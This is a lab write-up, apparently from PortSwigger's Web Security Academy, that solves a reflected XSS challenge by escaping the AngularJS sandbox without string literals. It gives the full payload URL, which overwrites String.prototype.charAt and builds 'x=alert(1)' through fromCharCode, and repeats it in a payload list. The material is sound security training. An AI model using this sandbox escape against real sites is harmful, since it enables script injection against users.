## Reflected XSS with AngularJS sandbox escape without strings

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab uses AngularJS in an unusual way where the$evalfunction is not available and you will be unable to use any strings in AngularJS.

### Solution Steps
Visit the following URL, replacing
YOUR-LAB-ID
with your lab ID:
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
The exploit uses
toString()
to create a string without using quotes. It then gets the
String
prototype and overwrites the
charAt
function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the
orderBy
filter. We then set the argument for the filter by again using
toString()
to create a string and the
String
constructor property. Finally, we use the
fromCharCode
method generate our payload by converting character codes into the string
x=alert(1)
. Because the
charAt
function has been overwritten, AngularJS will allow this code where normally it would not.

### Key Payloads
- `$eval`
- `alert`
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
- `toString()`
- `String`
- `charAt`
- `orderBy`
- `fromCharCode`
- `x=alert(1)`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected

---
*Source: PortSwigger Web Security Academy*
